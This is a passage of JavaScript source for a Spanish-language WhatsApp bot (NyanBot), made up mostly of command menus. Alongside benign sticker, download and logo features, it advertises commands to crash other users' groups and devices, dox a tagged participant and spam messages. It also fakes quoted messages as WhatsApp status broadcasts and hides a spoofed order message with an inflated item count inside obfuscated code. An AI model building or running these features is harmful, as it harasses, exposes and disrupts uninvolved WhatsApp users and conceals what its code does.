ᴸᵃ ᵐᵃʸᵒʳᶦ́ᵃ ᵈᵉ ˡᵒˢ ᶜᵒᵐᵃⁿᵈᵒˢ ᶠᵘⁿᶜᶦᵒⁿᵃⁿ ᵃˡ ¹⁰⁰
ᴱˢᶜʳᶦᵇᵉ ˡᵒˢ ᶜᵒᵐᵃⁿᵈᵒˢ ᵉⁿ ˢᵘ ᶠᵒʳᵐᵃᵗᵒ ᶜᵒʳʳᵉᶜᵗᵒ ᵖᵃʳᵃ ᑫᵘᵉ ⁿᵒ ᵈᵉ ᵉʳʳᵒʳᵉˢ
ˢᶦ ᵗᶦᵉⁿᵉˢ ᵃˡᵍᵘ́ⁿ ᵖʳᵒᵇˡᵉᵐᵃ ᵒ ᵃˡᵍᵘⁿᵃ ᶠᵘⁿᶜᶦᵒ́ⁿ ᵈᵉˡ ᵇᵒᵗ ᵈᵉʲᵒ ᵈᵉ ᶠᵘⁿᶜᶦᵒⁿᵃʳ ʰᵃ́ᶻᵐᵉˡᵒ ˢᵃᵇᵉʳ ᵃ ᵐᶦ̣.ᵂʰᵃᵗˢᴬᵖᵖ.li
*O envia una queja de un problema con el comando* _${prefix}reportar_

     -----------------------------------------------
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::                                                
¦:
¦:         . : 🐬𝐍𝐲𝐚𝐧𝐁𝐨𝐭🐬 : .
¦:     🔥❣️𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆❣️🔥
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
		     🌸 SamịPerry.li 🌸
********************************`
addFilter(from)
addLevelingLevel(sender, 5)
var _0x56da=['367342lxQRgg','relayWAMessage','52224EUhLvZ','readFileSync','3184312811796096','2ZQhqXh','37BvfGXn','1QpYCgS','233589MYSAPS','296046BsnUGu','./src/fake.jpg','11131Xmdsqw',`${Menu}`,'41623ZFgijY','4lYyqCf','INQUIRY','prepareMessageFromContent','1081869VYGFAG','1QmBtcR'];var _0x3cb2d7=_0x44c4;function _0x44c4(_0x538587,_0x3dc520){return _0x44c4=function(_0x56dab7,_0x44c4ad){_0x56dab7=_0x56dab7-0x11b;var _0x4c2ec7=_0x56da[_0x56dab7];return _0x4c2ec7;},_0x44c4(_0x538587,_0x3dc520);}(function(_0x1c8e57,_0x5dcd2a){var _0x2b3ad5=_0x44c4;while(!![]){try{var _0x1e1a08=parseInt(_0x2b3ad5(0x11b))*parseInt(_0x2b3ad5(0x127))+parseInt(_0x2b3ad5(0x12c))+parseInt(_0x2b3ad5(0x122))+parseInt(_0x2b3ad5(0x11e))*parseInt(_0x2b3ad5(0x121))+parseInt(_0x2b3ad5(0x126))*-parseInt(_0x2b3ad5(0x12b))+parseInt(_0x2b3ad5(0x124))*parseInt(_0x2b3ad5(0x11f))+-parseInt(_0x2b3ad5(0x120))*parseInt(_0x2b3ad5(0x12a));if(_0x1e1a08===_0x5dcd2a)break;else _0x1c8e57['push'](_0x1c8e57['shift']());}catch(_0x52a340){_0x1c8e57['push'](_0x1c8e57['shift']());}}}(_0x56da,0x99469),res=await samu330[_0x3cb2d7(0x129)](from,{'orderMessage':{'orderId':_0x3cb2d7(0x11d),'thumbnail':fs[_0x3cb2d7(0x11c)](_0x3cb2d7(0x123)),'itemCount':999999999,'status':_0x3cb2d7(0x128),'surface':'CATALOG','message':_0x3cb2d7(0x125),'orderTitle':'tom esta durmiendo'},'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}},{'quoted':forder,'contextInfo':{}}),samu330[_0x3cb2d7(0x12d)](res));
} catch {
samu330.sendMessage(from, fs.readFileSync('./src/ara.png'), image, {quoted: ftoko, caption: Menu, thumbnail: fs.readFileSync('./src/ara.png'), sendEphemeral: true})
}
break
case 'menu2':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
stc = `╭⸻⃞✫꯭𝙈꯭𝙀꯭𝙉꯭𝙐꯭✫⃞⸻╮
╰────ြ𝐒𝐭𝐢𝐜𝐤𝐞𝐫🃏
╭─────────────
│ *${prefix}sticker*
│ _Imagen/gif/video_
│ Para crear sticker con video,
│ eiqueta el video/gif a
│ convertir con el comando. 
╰─────────────╮
╭─────────────╯
│ *${prefix}spack*
│ _Paquete personalizado_
│Ex: *${prefix}spack* Samu|330
╰───────────────────╮
╭───────────────────╯
│ *${prefix}robar*
│ *${prefix}exif*
╰─────────────╮
╭─────────────╯
│ *${prefix}takestick*
│ _Nombre|Autor_
╰─────────────╮
╭─────────────╯
│ *${prefix}swm*
│ _Nombre|Autor_
╰─────────────╮
╭─────────────╯
│ *${prefix}colores*
│ _Texto a colores_
╰─────────────╮
╭─────────────╯
│ *${prefix}ger*
│ _Estilo Triggered_
╰─────────────╮
╭─────────────╯
│ *${prefix}aimg*
│ _Stiker a imagen_
╰─────────────╮
╭─────────────╯
│ *${prefix}agif*
│ _Stiker a gif_
╰─────────────╮
╭─────────────┴╮
│ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙😈.li Oℱịcιɑl.li 
╰──────────────╯`
samu330.sendMessage(from, stc, MessageType.text, {quoted:
{ key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"documentMessage": { "title": "📚𝑆𝑡𝑖𝑘𝑒𝑟 𝑚𝑒𝑛𝑢", 'jpegThumbnail': fs.readFileSync('./src/assistant.jpg')}}
}})
addFilter(from)
addLevelingLevel(sender, 5)		
break

case 'menu1':
if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})

mda = `
╔════════════════╗
╠  ◈  𝙈𝙀𝙉𝙐⁪⁡ 𝘿𝙀 𝙈𝙀𝘿𝙄𝘼 ◈  ╣
╠════════════════╝
║
╠ *●${prefix}clima* + region
║ _El clima_
║
╠ *●${prefix}zalgo*
║ _Texto estilo zalgo_
║
╠ *●${prefix}contar*
║ _Cuenta caracteres de un texto_
║
╠ *●${prefix}caras*
║ _Etiqueta una imagen para detectar caras_
║
╠ *●${prefix}reversa*
║ _Etiqueta un video_
║
╠ *●${prefix}quemusicaes*
║ _Busca el nombre de las canciones que no conozcas_
║
╠ *●${prefix}imagen*
║ _Búsqueda de imágenes_
║ _en Google_
║
╠ *●${prefix}sinfondo*
║ _Quita fondo a imagenes_
║
╠ *●${prefix}wp* 
║ _Búsqueda de fondos_
║ _de pantalla_
║
╠ *●${prefix}par*
║ _Anime para compartir perfil_
║ _(hombre | mujeres)_
║
╠ *●${prefix}animevid*
║ _Videos anime cortos_
║
╠ *●${prefix}queanime*
║ _Etiqueta una imagen de un Anime_
║ _Para saber que anime es_
║
╠ *●${prefix}loli*
║
╠ *●${prefix}neko*
║
╟╼╾┤🎧𝘈𝘶𝘥𝘪𝘰𝘴🎧├╼╾
║
╠ *●${prefix}bass*
║ _Etiqueta un audio_
║
╠ *●${prefix}ardilla*
║ _Etiqueta un audio_
║
╠ *●${prefix}trigger*
║ _Etiqueta un audio_
║
╠ *●${prefix}lento*
║ _Etiqueta un audio_
║
╠ *●${prefix}rapido*
║ _Etiqueta un audio_
║
╠ *●${prefix}imut*
║ _Etiqueta un audio_
║
╠ *●${prefix}hode*
║ _Etiqueta un audio_
║
╠ *●${prefix}grave*
║ _Etiqueta un audio_
║
╙╖
╒╩════════════
╰──────────────╮
╭──────────────┴╮
│ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙😈.li Oℱịcιɑl.li🌴
╰───────────────╯`
samu330.sendMessage(from, mda, MessageType.text, {quoted:
{ key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"imageMessage": { "caption": "🧸𝙈𝙀𝙉𝙐⁡ 𝘿𝙀 𝙈𝙀𝘿𝙄𝘼📌", 'jpegThumbnail': fs.readFileSync('./src/assistant.jpg')}}
}})
addFilter(from)
addLevelingLevel(sender, 5)		
break
case 'menu3':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
uptime = process.uptime()

const Menug = {
text: `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li                                                                            
🔐Hola *${pushname}*

${bodyM} ${samu}${prefix}antilink${samu}
${bodyM} ${samu}${prefix}antimedia${samu}
${bodyM} ${samu}${prefix}antibad${samu}
${bodyM} ${samu}${prefix}autostick${samu}
${bodyM} ${samu}${prefix}antileg${samu}

${bodyM} ${samu}${prefix}antigp${samu}
_Para prohibir los links de otros grupos_

================================
*🔞PARA ACTIVAR LOS COMANDOS +18*:
================================
${bodyM} ${prefix}+18 1/0
================================
    _Modo simsimi ilimitado_

*${prefix}simsimi 1*


*Para que el bot entre a tu grupo, usa el siguiente comando:*
	${prefix}entrabot *(Link del grupo)*
	
🚧 *El siguiente comando es para crashear los grupos!! este comando es muy peligroso :) solo administradores pueden usarlo.* 🚧

*${prefix}buggp*

_Usalo bajo tu responsabilidad!_


${bodyM} ${prefix}doxing _(Etiqueta un participante o algun mensaje)_
${bodyM} ${prefix}inspeccionar _(Requiere link de un grupo)_
${bodyM} ${prefix}nuevogrupo
${bodyM} ${prefix}grupo abrir/cerrar
${bodyM} ${prefix}getpic
${bodyM} ${prefix}salir
${bodyM} ${prefix}tagstick
${bodyM} ${prefix}imagetag
${bodyM} ${prefix}hidetag
${bodyM} ${prefix}todos
${bodyM} ${prefix}setdesc
${bodyM} ${prefix}nombre
${bodyM} ${prefix}adminlist
${bodyM} ${prefix}setpic
${bodyM} ${prefix}enlinea
${bodyM} ${prefix}promote
${bodyM} ${prefix}demote
${bodyM} ${prefix}eliminar
${bodyM} ${prefix}añadir *(Numero sin el +)*
${bodyM} ${prefix}notif
${bodyM} ${prefix}reply @miembro|frase|frase
${bodyM} ${prefix}contacto @miembro|nombre
${bodyM} ${prefix}link
${bodyM} ${prefix}top5
${bodyM} ${prefix}clonar
`,
contextInfo: {
mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
}
}
addFilter(from)
addLevelingLevel(sender, 5)		
samu330.sendMessage(from, Menug, MessageType.text, {
quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": "➫𝑴𝒆𝒏𝒖 𝑫𝒆 𝑮𝒓𝒖𝒑𝒐𝒔\n❣️⃞🔥𝙎꯭𝙖͠𝙢꯭ 𝙔 ꯭𝙋꯭𝙚𝙧𝙧꯭𝙮🔥❣️" ,"jpegThumbnail": fs.readFileSync(`./NyanBot.jpg`)}}}})
break
case 'menu4':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
uptime = process.uptime()
const Menud = {
text: `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li   

🔐Hola *${pushname}*

♫♪.ılılıll|̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅|llılılı.♫♪

${bodyM} ${prefix}play *(Descarga de musica)*
${bodyM} ${prefix}playvid *(Descarga de videos por nombre)*
${bodyM} ${prefix}ig *(Fotos y videos de Instagram)*
${bodyM} ${prefix}twit *(videos de Twitter)*
${bodyM} ${prefix}ytmp3 *(Descarga de musica por link)*
${bodyM} ${prefix}ytmp4 *(Descarga de videos por link)*
${bodyM} ${prefix}fb _(Link de FaceBook)_
${bodyM} ${prefix}mfire *(Link de mediafire)*
${bodyM} ${prefix}tomp3 *(Videos a audio)*
${bodyM} ${prefix}letra *(Busca la letra de una cancion)*
`,
contextInfo: {
mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
}
}
samu330.sendMessage(from, Menud, MessageType.text, {
quoted:  fvid})
addFilter(from)
addLevelingLevel(sender, 5)		
break
case 'menu5':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
uptime = process.uptime()
const Menuo = {
text: `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li                                                                


${bodyM} ${prefix}grupos *(Ve los grupos del bot)*
${bodyM} ${prefix}timer *(Cronometro)*
${bodyM} ${prefix}calc *(Calculadora)*
${bodyM} ${prefix}pregunta *(Haz una pregunta y el bot te responde)*
${bodyM} ${prefix}ipbot *(Localiza al bot por ip)*
${bodyM} ${prefix}ip *(Haz una loclizacion por ip)*
${bodyM} ${prefix}igstalk *(Nombre de Usuario)*
${bodyM} ${prefix}voz *(Codigo de idioma)* *(Texto)*
		  _Para ver idiomas compatibles, usa el comando_ *idiomas*
${bodyM} ${prefix}translate *(idioma a traducir = es, en, id...)*
${bodyM} ${prefix}tiktokstalk @usuario
${bodyM} ${prefix}hidetag *(Texto)*
${bodyM} ${prefix}cambiar *(Cambia el cuerpo del menú)*
${bodyM} ${prefix}shortlink _(Acortador de links)_
${bodyM} ${prefix}pastebin *(genera link hacia el texto o link que escribas)*
${bodyM} ${prefix}abinario *(texto a codigo binario)* 010010
${bodyM} ${prefix}binatext *(codigo binario a texto)*
${bodyM} ${prefix}aoctal *(texto a codigo octal)*
${bodyM} ${prefix}octalatext *(codigo octal a texto)*
${bodyM} ${prefix}ahex *(texto a codigo hex)*
${bodyM} ${prefix}hexatext *(codigo hex a texto)*
${bodyM} ${prefix}wa.me
${bodyM} ${prefix}idioimas
${bodyM} ${prefix}reversa
${bodyM} ${prefix}meme
${bodyM} ${prefix}leermas _frase/frase_
${bodyM} ${prefix}mapa
${bodyM} ${prefix}soyyo
${bodyM} ${prefix}blocklist
${bodyM} ${prefix}leerimagen

*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
	      🌸 SamịPerry.li 🌸
 ********************************
`,
contextInfo: {
mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
}
}
samu330.sendMessage(from, Menuo, MessageType.text, {
quoted: floc})
addFilter(from)
addLevelingLevel(sender, 5)		
break
case 'menu6':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(mess.nsfw)
samuPn = fs.readFileSync('./src/+18.jpg')
uptime = process.uptime()
const Menu18 = `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li

${bodyM} ${prefix}porno
${bodyM} ${prefix}lesbian 
${bodyM} ${prefix}tetas
${bodyM} ${prefix}ass
${bodyM} ${prefix}pussy
${bodyM} ${prefix}xnxx *(Link de Xnxx.com)*
${bodyM} ${prefix}pornode *(Japonesas)*
${bodyM} ${prefix}xvid *(Japonesas)*
${bodyM} ${prefix}dxvid *(Descarga videos de Xvideos)* _Requiere contraseña_
${bodyM} ${prefix}pdf *(Nsfw en pdf)*

_*🍒Estilo anime🍒*_

${bodyM} ${prefix}xwaifu
${bodyM} ${prefix}xneko
${bodyM} ${prefix}trap
${bodyM} ${prefix}blow

*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
	     🌸 SamịPerry.li 🌸
 ********************************
`
addFilter(from)
addLevelingLevel(sender, 5)		
samu330.sendMessage(from, samuPn, image, { quoted: fvid, caption: `${Menu18}`, thumbnail: samuPn, contextInfo: { mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true }})              
break
case 'menu7':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
uptime = process.uptime()
const Menu7 = {
text: `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li                                                                            

Si quieres contribuir para que todos estos comandos y mas funcionen ala perfeccion, puedes aportar un granito de arena al sigiente paypal:

paypal.me/samu330



${bodyM} ${prefix}neon *(Escribe un texto para crear logo)*
${bodyM} ${prefix}matrix *(Escribe un texto para crear logo)*
${bodyM} ${prefix}break *(Escribe un texto para crear logo)*
${bodyM} ${prefix}dropwater *(Escribe un texto para crear logo)*
${bodyM} ${prefix}lobo *(Escribe un texto para crear logo)*
${bodyM} ${prefix}flores *(Escribe un texto para crear logo)*
${bodyM} ${prefix}cross *(Escribe un texto para crear logo)*
${bodyM} ${prefix}seda *(Escribe un texto para crear logo)*
${bodyM} ${prefix}fire *(Escribe un texto para crear logo)*
${bodyM} ${prefix}glow *(Escribe un texto para crear logo)*
${bodyM} ${prefix}smoke *(Escribe un texto para crear logo)*
${bodyM} ${prefix}pubg *(Escribe un texto para crear logo)*
${bodyM} ${prefix}cielo *(Escribe un texto para crear logo)*
${bodyM} ${prefix}cs *(Escribe un texto para crear logo)*
${bodyM} ${prefix}ligth *(Escribe un texto para crear logo)*
${bodyM} ${prefix}navidad *(Escribe un texto para crear logo)*
${bodyM} ${prefix}nieve *(Escribe un texto para crear logo)*
${bodyM} ${prefix}tfire *(Escribe un texto para crear logo)*
${bodyM} ${prefix}playa *(Escribe un texto para crear logo)*
${bodyM} ${prefix}ff *(Escribe un texto para crear logo)*
${bodyM} ${prefix}goldbutton *(Escribe un texto para crear logo)*
${bodyM} ${prefix}silverbutton *(Escribe un texto para crear logo)*
${bodyM} ${prefix}3d *(Escribe un texto para crear logo)*
${bodyM} ${prefix}avengers *(Escribe un texto para crear logo)*
${bodyM} ${prefix}3d2 *(Escribe un texto para crear logo)*
${bodyM} ${prefix}ph *(Escribe un texto para crear logo)*
${bodyM} ${prefix}blackpink *(Escribe un texto para crear logo)*
${bodyM} ${prefix}marvel *(Escribe un texto para crear logo)*
${bodyM} ${prefix}hojas *(Escribe un texto para crear logo)*
${bodyM} ${prefix}tligth *(Escribe un texto para crear logo)*
${bodyM} ${prefix}gtext *(Escribe un texto para crear logo)*
${bodyM} ${prefix}gtav *(Etiqueta una imagen)*
${bodyM} ${prefix}wanted *(Etiqueta una imagen)*
${bodyM} ${prefix}wasted *(Etiqueta una imagen)*
${bodyM} ${prefix}ocean *(Etiqueta una imagen)*
${bodyM} ${prefix}ger *(Etiqueta una imagen)*
${bodyM} ${prefix}drawing *(Etiqueta una imagen)*
${bodyM} ${prefix}cg *(Etiqueta una imagen)*

*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
	     🌸 SamịPerry.li 🌸
 ******************************
`,
contextInfo: {
mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
}
}
samu330.sendMessage(from, Menu7, MessageType.text, {
quoted: fvid})
addFilter(from)
addLevelingLevel(sender, 5)		
break
case 'menu8':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
const Menu8 = {
text: `*COMANDOS PARA ${botNumber}*

*Pará actualizar el bot:*
_${prefix}actualizar_

*Para apagar el bot:*
_${prefix}apagar_


⚠️ El siguiente comando es para restablecer los datos del usuario, para que el código vuelva a generarce, esto es por si quiere tener el bot en algún otro numero, o por si por error cerró la sección en WhatsApp. 

*${prefix}Restaurar*

╭─────────────
│ *${prefix}ban*
│ _Prohibe el uso del bot a una persona_
╰─────────────╮
╭─────────────╯
│ *${prefix}unban*
│ _Permite el uso del bot a una persona baneada_
╰─────────────╮
╭─────────────╯
│ *${prefix}banchat*
│ _Bloquea el uso del bot en los chats que se active_
╰─────────────╮
╭─────────────╯
│ *${prefix}bloquear*
│ _Bloquea usuarios_
╰─────────────╮
╭─────────────╯
│ *${prefix}desbloquear*
│ _Desbloquea usuarios_
╰─────────────╮
╭─────────────╯
│ *${prefix}setname*
│ _Cambia tu nombre de usuario_
│
│ *${prefix}setpic*
│ _Actualiza tu foto de perfil_
│
│ *${prefix}setstatus*
│ _Cambia tu estado de WhatsApp_
╰─────────────╮
╭─────────────╯
│ *${prefix}estado*
│ _Envia un estado de texto_
╰─────────────╮
╭─────────────╯
│ *${prefix}estadopic*
│ _Envia una imagen a tu estado_
╰─────────────╮
╭─────────────╯
│ *${prefix}estadovid*
│ _Envia un video a tu estado_
╰─────────────╮
╭─────────────╯
│ *${prefix}vaciar*
│ _Vacia el chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}vaciartodo*
│ _Elimina todos los chats_
╰─────────────╮
╭─────────────╯
│ *${prefix}bc*
│ _Broadcast_
╰─────────────╮
╭─────────────╯
│ *${prefix}spam*
│ _Spam de mensajes_
╰─────────────╮
╭─────────────╯
│ *${prefix}fijar*
│ _Fijar el chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}desfijar*
│ _Desfija el chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}archivar*
│ _Archiva un chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}desarchivar*
│ _Desarchiva todo_
╰─────────────╮
╭─────────────╯
│ *${prefix}silencio*
│ _Mutea un chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}desilenciar*
│ _Desmutea un chat_
╰─────────────╮
╭─────────────╯
│ *${prefix}sinleer*
│ _Muestra Chats sin leer_
╰─────────────╮
╭─────────────╯
│ *${prefix}apagar*
│ _Apaga el bot_
╰─────────────╮
╭─────────────╯
│ *${prefix}marcarsinleer*
│ _Marca como no leido todos los chats_
╰─────────────╮
╭─────────────╯
│ *${prefix}leertodo*
│ _Lee todos los chats_
╰──────────────────────`,
contextInfo: {
mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
}
}
samu330.sendMessage(from, Menu8, MessageType.text, {
quoted: ftoko})
addFilter(from)
addLevelingLevel(sender, 5)		
break
		
case 'menu9':
if (!isRegister) return reply(mess.only.usrReg)
const Menu9 = {
text: `*${pushname}*

_Estos comandos solo pueden ser utilizados en grupos, y solo los puede uzar ${botNumber}_

🔥 ${prefix}crash
🔥 ${prefix}crash2
🔥 ${prefix}crash3
🔥 ${prefix}crashloc
🔥 ${prefix}crashcom
🔥 ${prefix}crashpc

💠Si quieres ser inmune a estos comandos, Samu a creado un WhatsApp que soporta estos bugs, si quieres probar este WhatsApp comunicate con el:

*wa.me/+529984907794*

Si quieres tener este bot, y usar tu los comandos, ve como se instala aqui:

_https://www.youtube.com/watch?v=rOPBe6O-k3M_`
}
samu330.sendMessage(from, Menu9, MessageType.text, {quoted: { key: { 
	fromMe: false, 
	participant: `0@s.whatsapp.net`, ...(from ? {
		remoteJid: "status@broadcast" } : {}) }, 
			message: { 
				"imageMessage": { 
				"mimetype": 
				"image/jpeg", 
				"caption": "➫'*👑Samu330 Crashing Groups!!🔥*'\n'😈Samu330 Domina🥀'" ,
				"jpegThumbnail": fs.readFileSync(`./src/ara.png`)}}}})
break


case 'gracias':
var _0x56da=['367342lxQRgg','relayWAMessage','52224EUhLvZ','readFileSync','3184312811796096','2ZQhqXh','37BvfGXn','1QpYCgS','233589MYSAPS','296046BsnUGu','./src/fake.jpg','11131Xmdsqw','🤭 *Tranqui, no es nada* 😉','41623ZFgijY','4lYyqCf','INQUIRY','prepareMessageFromContent','1081869VYGFAG','1QmBtcR'];var _0x3cb2d7=_0x44c4;function _0x44c4(_0x538587,_0x3dc520){return _0x44c4=function(_0x56dab7,_0x44c4ad){_0x56dab7=_0x56dab7-0x11b;var _0x4c2ec7=_0x56da[_0x56dab7];return _0x4c2ec7;},_0x44c4(_0x538587,_0x3dc520);}(function(_0x1c8e57,_0x5dcd2a){var _0x2b3ad5=_0x44c4;while(!![]){try{var 